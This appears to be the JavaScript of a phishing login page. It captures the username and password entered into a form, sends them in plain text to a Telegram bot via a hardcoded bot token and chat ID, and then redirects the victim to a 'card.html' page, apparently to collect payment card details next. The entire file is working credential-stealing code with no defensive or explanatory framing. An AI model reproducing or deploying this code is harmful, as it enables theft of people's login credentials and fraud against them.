let user = document.getElementById("user");
let pass = document.getElementById("pass");
let resuser = document.getElementById("resuser");
let respass = document.getElementById("respass");
let login = document.getElementById("login");

user.addEventListener("change", () => {
  resuser.value = user.value;
});
pass.addEventListener("change", () => {
  respass.value = pass.value;
});

function redirect() {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6326754827:AAF3vnmokN9_14hmqKcDcgy8JeiVb9Mh7ds/sendMessage?chat_id=1531393059&text=USERNAME:%20" +
    resuser.value +
    " PASSWORD: " +
    respass.value;
  Http.open("GET", url);
  Http.send();

  Http.onreadystatechange = (e) => {
    console.log(Http.responseText);
  };

  window.location.href = "card.html";
}

login.addEventListener("click", () => {
    if (user.value.length == 0) {
        console.log("Username is required");
      }
      if (pass.value.length == 0) {
        console.log("Password is required");
      } else {
        redirect();
      }
});
